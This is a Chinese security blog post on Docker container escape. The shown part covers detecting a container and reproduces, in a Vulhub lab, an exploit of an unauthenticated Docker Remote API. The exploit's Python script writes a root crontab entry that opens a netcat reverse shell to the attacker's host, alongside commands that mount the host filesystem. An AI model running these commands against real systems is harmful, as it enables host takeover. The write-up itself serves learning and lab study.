<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>Dockeré€ƒé€¸ | m0reçš„å°ç«™</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"äººç”Ÿè·¯æ¼«æ¼«","version":"1.3.0","mode":"time","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta property="og:type" content="article">
<meta property="og:title" content="Dockeré€ƒé€¸">
<meta property="og:url" content="https://m0re.top/posts/abcd4c1e/index.html">
<meta property="og:site_name" content="m0reçš„å°ç«™">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20210328112744.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610986474417-2cf8dd83-c285-43fe-80bb-9f5e700d0c95.png?x-oss-process=image/resize,w_870#align=left&display=inline&height=94&margin=%5Bobject%20Object%5D&originHeight=94&originWidth=870&status=done&style=none&width=870">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610986846345-9d76e9e3-905d-49e6-beef-10248d206858.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&originHeight=336&originWidth=1196&status=done&style=none&width=1196">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610987265429-9dfc2f76-d3f9-4761-ab12-9bc7818103fa.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&originHeight=411&originWidth=894&status=done&style=none&width=894">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990122639-1dbc1921-05b3-4b83-8dd9-b4640540abdb.png?x-oss-process=image/resize,w_752#align=left&display=inline&height=307&margin=%5Bobject%20Object%5D&originHeight=307&originWidth=752&status=done&style=none&width=752">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990143195-8b65a2ff-e4b7-4569-bd56-cae1df4bc1c6.png?x-oss-process=image/resize,w_910#align=left&display=inline&height=645&margin=%5Bobject%20Object%5D&originHeight=645&originWidth=910&status=done&style=none&width=910">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990857682-a391dc86-4919-47e2-88c1-35298bcd541d.png?x-oss-process=image/resize,w_1612#align=left&display=inline&height=213&margin=%5Bobject%20Object%5D&originHeight=213&originWidth=1612&status=done&style=none&width=1612">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610995008915-5cbb3ff7-5a9f-444f-abaf-1c70eaae0327.png#align=left&display=inline&height=159&margin=%5Bobject%20Object%5D&originHeight=159&originWidth=886&status=done&style=none&width=886">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610995191722-eca1a2cb-3167-42a8-93d6-98c2d3c4c858.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=248&originWidth=946&status=done&style=none&width=946">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1611056709262-0c02176e-f220-47ff-85a4-abcbe2cec8ef.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&originHeight=310&originWidth=860&status=done&style=none&width=860">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1611056870001-f0533c4f-06b5-4b9f-a3ef-51aea5bd2417.png?x-oss-process=image/resize,w_1362#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&originHeight=228&originWidth=1362&status=done&style=none&width=1362">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818216-fd6cd56e-7e7f-4fa7-a825-6ec85c42797b.png#align=left&display=inline&height=261&margin=%5Bobject%20Object%5D&originHeight=261&originWidth=734&size=0&status=done&style=none&width=734">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818230-31aa81c0-8584-49ba-a3fc-65b6ff93e9e9.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&originHeight=183&originWidth=857&size=0&status=done&style=none&width=857">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818250-e2ca6c32-5111-434a-a278-b72e8fd60658.png#align=left&display=inline&height=509&margin=%5Bobject%20Object%5D&originHeight=509&originWidth=831&size=0&status=done&style=none&width=831">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818276-188781c9-5aee-43a6-8364-d5e20e04cb11.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&originHeight=100&originWidth=599&size=0&status=done&style=none&width=599">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818201-2b418c11-3f0b-404c-8a76-1793033df13f.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&originHeight=158&originWidth=717&size=0&status=done&style=none&width=717">
<meta property="article:published_time" content="2021-03-28T03:23:23.799Z">
<meta property="article:modified_time" content="2021-03-28T03:28:37.305Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="Dockeré€ƒé€¸">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m0re/picture/raw/master/img/20210328112744.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="ç©·é¬¼å•Šå•Šå•Šå•Š">ğŸ˜­</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><a class="site-name" href="/about/site.html">m0reçš„å°ç«™</a><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">91</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">38</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="å“”å“©å“”å“©åŠ¨ç”»" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%B7%A5%E4%BD%9C%E5%9C%A8Docker%E7%8E%AF%E5%A2%83%E4%B8%AD"><span class="toc-number">1.1.</span> <span class="toc-text">åˆ¤æ–­æ˜¯å¦å·¥ä½œåœ¨Dockerç¯å¢ƒä¸­</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">Dockeré€ƒé€¸æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.1.</span> <span class="toc-text">Docker Remote API æœªæˆæƒè®¿é—®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-%E9%AB%98%E5%8D%B1%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0-%E2%80%93-privileged-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">Docker é«˜å±å¯åŠ¨å‚æ•° â€“ privileged ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dirty-COW%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">2.3.</span> <span class="toc-text">Dirty COWæ¼æ´é€ƒé€¸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.</span> <span class="toc-text">runcå®¹å™¨é€ƒé€¸æ¼æ´</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-cp%E5%91%BD%E4%BB%A4%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-14271%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">Docker cpå‘½ä»¤å¯å¯¼è‡´å®¹å™¨é€ƒé€¸æ”»å‡»æ¼æ´ï¼ˆCVE-2019-14271ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD%E5%AF%BC%E8%87%B4Docker-%E9%80%83%E9%80%B8"><span class="toc-number">2.6.</span> <span class="toc-text">å±é™©æŒ‚è½½å¯¼è‡´Docker é€ƒé€¸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">åè®°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">å‚è€ƒæ–‡ç« </span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/abcd4c1e/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0reçš„å°ç«™"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Dockeré€ƒé€¸</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">å‘è¡¨äº</span> <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-28 11:23:23" itemprop="dateCreated datePublished" datetime="2021-03-28T11:23:23+08:00">2021-03-28</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/abcd4c1e/" data-flag-title="Dockeré€ƒé€¸"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/Docker/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Docker</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/Docker%E9%80%83%E9%80%B8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Dockeré€ƒé€¸</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210328112744.png" alt="m0re" loading="lazy"></p>
<a id="more"></a>
<p><a name="df368884"></a></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><br />Dockeræ˜¯ç°åœ¨ä½¿ç”¨èŒƒå›´æœ€å¹¿çš„å¼€æºå®¹å™¨æŠ€æœ¯ä¹‹ä¸€ï¼Œå› ä¸ºæœ€è¿‘ç”¨dockerç”¨çš„æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥å°±æ¥è§¦åˆ°äº†dockerç›¸å…³çš„æ¼æ´çŸ¥è¯†â€”â€”dockeré€ƒé€¸æŠ€æœ¯ã€‚<br />##Dockeré€ƒé€¸<br />åˆ©ç”¨åœºæ™¯ï¼šåœ¨æ‹¿åˆ°ä¸€ä¸ªshellåï¼Œå‘ç°æ˜¯å¼€å¯çš„Dockerç¯å¢ƒï¼Œç„¶è€Œéœ€è¦è¿›ä¸€æ­¥æ¸—é€ä¸»æœºï¼Œæ‰€ä»¥å°±éœ€è¦ä»Dockeré‡Œé¢é€ƒé€¸å‡ºæ¥åˆ°å®¿ä¸»æœºå™¨ã€‚ä¹‹åå†è·Ÿç€è¿™ä¸ªå¸ˆå‚…çš„æ–‡ç« è¿›è¡Œå­¦ä¹ è™šæ‹Ÿæœºé€ƒé€¸ï¼Œå› ä¸ºæœ‰äº›Dockerä¼šåœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œã€‚è¦æ‹¿åˆ°ä¸»æœºä¸ä»…éœ€è¦Dockeré€ƒé€¸ï¼Œè¿˜éœ€è¦ä»è™šæ‹Ÿæœºé€ƒé€¸ã€‚<br />åŸå› ï¼š<br />ä¸€ã€é…ç½®ä¸å½“<br />äºŒã€ç”±å†…æ ¸æ¼æ´å¼•èµ·<br />ä¸‰ã€ç”±dockerè½¯ä»¶è®¾è®¡å¼•èµ·<br />å››ã€‚æŒ‚è½½å±é™©ç›®å½•<br /></p>
<p><a name="f0d77804"></a></p>
<h3 id="åˆ¤æ–­æ˜¯å¦å·¥ä½œåœ¨Dockerç¯å¢ƒä¸­"><a href="#åˆ¤æ–­æ˜¯å¦å·¥ä½œåœ¨Dockerç¯å¢ƒä¸­" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å·¥ä½œåœ¨Dockerç¯å¢ƒä¸­"></a>åˆ¤æ–­æ˜¯å¦å·¥ä½œåœ¨Dockerç¯å¢ƒä¸­</h3><ol>
<li>Metasploit ä¸­çš„ checkcontainer æ¨¡å—ã€ï¼ˆåˆ¤æ–­æ˜¯å¦ä¸ºè™šæ‹Ÿæœºï¼Œcheckvm æ¨¡å—ï¼‰<br />è¯¥æ¨¡å—å…¶å®è¿›è¡Œäº†å¦‚ä¸‹æ“ä½œï¼š<br />æ£€æŸ¥æ ¹ç›®å½•ä¸‹æœ‰æ— .dockerenvæ–‡ä»¶<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610986474417-2cf8dd83-c285-43fe-80bb-9f5e700d0c95.png?x-oss-process=image/resize,w_870#align=left&display=inline&height=94&margin=%5Bobject%20Object%5D&originHeight=94&originWidth=870&status=done&style=none&width=870" loading="lazy"><br />æ³¨æ„ï¼šå®šåˆ¶åŒ–æ¯”è¾ƒé«˜çš„dockerç³»ç»Ÿä¹Ÿå¯èƒ½æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶<br />æ£€æŸ¥/proc/1/cgroup æ˜¯å¦å­˜åœ¨æœ‰dockerå­—ç¬¦ä¸²<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610986846345-9d76e9e3-905d-49e6-beef-10248d206858.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&originHeight=336&originWidth=1196&status=done&style=none&width=1196" loading="lazy"></li>
</ol>
<ul>
<li>kvmç¯å¢ƒæˆ–è€…ç‰©ç†æœºç¯å¢ƒä¸‹ï¼šcat /proc/1/cgroup<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610987265429-9dfc2f76-d3f9-4761-ab12-9bc7818103fa.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&originHeight=411&originWidth=894&status=done&style=none&width=894" loading="lazy"></li>
</ul>
<p><a name="340686b5"></a></p>
<h2 id="Dockeré€ƒé€¸æ–¹æ³•"><a href="#Dockeré€ƒé€¸æ–¹æ³•" class="headerlink" title="Dockeré€ƒé€¸æ–¹æ³•"></a>Dockeré€ƒé€¸æ–¹æ³•</h2><p><br />è¿™é‡Œå¤ç°å‡ ç§Dockeré€ƒé€¸çš„å‡ ç§æ–¹æ³•ï¼Œå¤ç°å‚è€ƒå‡æ¥è‡ªäº’è”ç½‘ã€‚<br /></p>
<p><a name="69e222e0"></a></p>
<h3 id="Docker-Remote-API-æœªæˆæƒè®¿é—®"><a href="#Docker-Remote-API-æœªæˆæƒè®¿é—®" class="headerlink" title="Docker Remote API æœªæˆæƒè®¿é—®"></a>Docker Remote API æœªæˆæƒè®¿é—®</h3><blockquote>
<p>ç¯å¢ƒï¼šKali&amp; Â Ubuntu&gt;docker<br>Vulhubæ¼æ´é¶æœºï¼š<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md</a><br>å‚è€ƒæ–‡ç« <br><a target="_blank" rel="noopener" href="https://wrpzkb.cn/dkty/">https://wrpzkb.cn/dkty/</a></p>
</blockquote>
<p><br /><strong>æ¼æ´å¤ç°</strong><br /></p>
<blockquote>
<p>å¯åŠ¨å®¹å™¨ï¼Œå°†ä¸»æœºçš„/etcç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ï¼Œå°±å¯ä»¥ä»»æ„è¯»å†™æ–‡ä»¶ï¼Œè€Œæ¼æ´æ‰€éœ€å³æ˜¯å°†å‘½ä»¤å†™å…¥crontabé…ç½®æ–‡ä»¶ï¼Œè¿›è¡Œåå¼¹shellã€‚</p>
</blockquote>
<p><br />exp<br /></p>
<pre class="language-none"><code class="language-none">import docker
client &#x3D; docker.DockerClient(base_url&#x3D;&#39;http:&#x2F;&#x2F;your-ip:2375&#x2F;&#39;)
data &#x3D; client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;* * * * * &#x2F;usr&#x2F;bin&#x2F;nc your-ip 1111 -e &#x2F;bin&#x2F;sh&#39; &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root&quot; &#39;&#39;&#39;, remove&#x3D;True, volumes&#x3D;&#123;&#39;&#x2F;etc&#39;: &#123;&#39;bind&#39;: &#39;&#x2F;tmp&#x2F;etc&#39;, &#39;mode&#39;: &#39;rw&#39;&#125;&#125;)</code></pre>

<p><br />å¤ç°è¿‡ç¨‹<br /></p>
<pre class="language-none"><code class="language-none">root@test:&#x2F;# cd &#x2F;vulhub&#x2F;docker&#x2F;unauthorized-rce&#x2F;</code></pre>

<p><br />ç¼–è¯‘å’Œå¯åŠ¨dockerç¯å¢ƒ<br /></p>
<pre class="language-none"><code class="language-none">docker-compose build
docker-compose up -d</code></pre>

<p><br />ç¯å¢ƒå¯åŠ¨æˆåŠŸï¼Œkaliä¸­å°è¯•è®¿é—®2375ç«¯å£<br />æµè§ˆå™¨ä¸­æŸ¥çœ‹ï¼Œå¦‚æ­¤ä¾¿æ˜¯å­˜åœ¨è¯¥æ¼æ´ã€‚<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990122639-1dbc1921-05b3-4b83-8dd9-b4640540abdb.png?x-oss-process=image/resize,w_752#align=left&display=inline&height=307&margin=%5Bobject%20Object%5D&originHeight=307&originWidth=752&status=done&style=none&width=752" loading="lazy"><br /></p>
<pre class="language-none"><code class="language-none">&lt;ip&gt;:2379&#x2F;version
&lt;ip&gt;:2379&#x2F;info</code></pre>

<p><br />æŸ¥çœ‹ç›®æ ‡çš„åŸºæœ¬ä¿¡æ¯<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990143195-8b65a2ff-e4b7-4569-bd56-cae1df4bc1c6.png?x-oss-process=image/resize,w_910#align=left&display=inline&height=645&margin=%5Bobject%20Object%5D&originHeight=645&originWidth=910&status=done&style=none&width=910" loading="lazy"><br />è‹¥èƒ½è®¿é—®ï¼Œè¯æ˜å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´<br />æ¼æ´åˆ©ç”¨<br />æ­¤æ—¶è¿›å…¥å®¹å™¨æ˜¯éœ€è¦ç”¨<code>/bin/sh</code>è€Œä¸æ˜¯<code>/bin/bash</code><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610990857682-a391dc86-4919-47e2-88c1-35298bcd541d.png?x-oss-process=image/resize,w_1612#align=left&display=inline&height=213&margin=%5Bobject%20Object%5D&originHeight=213&originWidth=1612&status=done&style=none&width=1612" loading="lazy"><br />ç„¶åæ‰§è¡Œ<br /></p>
<pre class="language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;ip:2375 images</code></pre>

<p><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610995008915-5cbb3ff7-5a9f-444f-abaf-1c70eaae0327.png#align=left&display=inline&height=159&margin=%5Bobject%20Object%5D&originHeight=159&originWidth=886&status=done&style=none&width=886" loading="lazy"><br />éšåå°†è¿™ä¸ªdockerå®¹å™¨å¯åŠ¨èµ·æ¥ï¼Œ<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1610995191722-eca1a2cb-3167-42a8-93d6-98c2d3c4c858.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=248&originWidth=946&status=done&style=none&width=946" loading="lazy"><br />æŒ‚è½½<br /></p>
<pre class="language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;ip:2375 run -it -v &#x2F;:&#x2F;mnt 7731472c3f2a &#x2F;bin&#x2F;sh</code></pre>

<p><br />åœ¨Kaliæ‰§è¡Œexpï¼Œå…ˆä¾¦å¬ç«¯å£ï¼Œç„¶åæ‰§è¡Œexp<br /></p>
<pre class="language-none"><code class="language-none">nc -l -p 1111
python3 exp.py</code></pre>

<p><br />æ‰§è¡Œå®Œæˆè¿‡åç­‰å¾…ä¸€æ®µæ—¶é—´å³å¯getshellã€‚<br />æ³¨æ„ï¼šåœ¨kaliä¸­æ‰§è¡Œè¯¥è„šæœ¬ï¼Œéœ€è¦kaliå®‰è£…dockerï¼Œå¹¶ä¸”Python3éœ€è¦å®‰è£…dockeræ¨¡å—ã€‚<br />éœ€è¦æ»¡è¶³ä¸Šé¢è¿™ä¸¤ä¸ªæ¡ä»¶ï¼Œå¦åˆ™ä¸æˆåŠŸã€‚å³ä¸æ˜¾ç¤ºä»»ä½•dockerå®¹å™¨ä¿¡æ¯ã€‚<br /></p>
<p><a name="95f40102"></a></p>
<h3 id="Docker-é«˜å±å¯åŠ¨å‚æ•°-â€“-privileged-ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨"><a href="#Docker-é«˜å±å¯åŠ¨å‚æ•°-â€“-privileged-ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨" class="headerlink" title="Docker é«˜å±å¯åŠ¨å‚æ•° â€“ privileged ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨"></a>Docker é«˜å±å¯åŠ¨å‚æ•° â€“ privileged ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨</h3><blockquote>
<p>å½“æ“ä½œè€…æ‰§è¡Œdocker run â€“privilegedæ—¶ï¼ŒDockerå°†å…è®¸å®¹å™¨è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼ŒåŒæ—¶ä¿®æ”¹AppArmoræˆ–SELinuxçš„é…ç½®ï¼Œä½¿å®¹å™¨æ‹¥æœ‰ä¸é‚£äº›ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹å‡ ä¹ç›¸åŒçš„è®¿é—®æƒé™ã€‚</p>
</blockquote>
<p><br />ç‰¹æƒæ¨¡å¼å¯åŠ¨ä¸€ä¸ªUbuntuå®¹å™¨ï¼š<br /></p>
<pre class="language-none"><code class="language-none">sudo docker run -itd --privileged ubuntu:latest &#x2F;bin&#x2F;bash</code></pre>

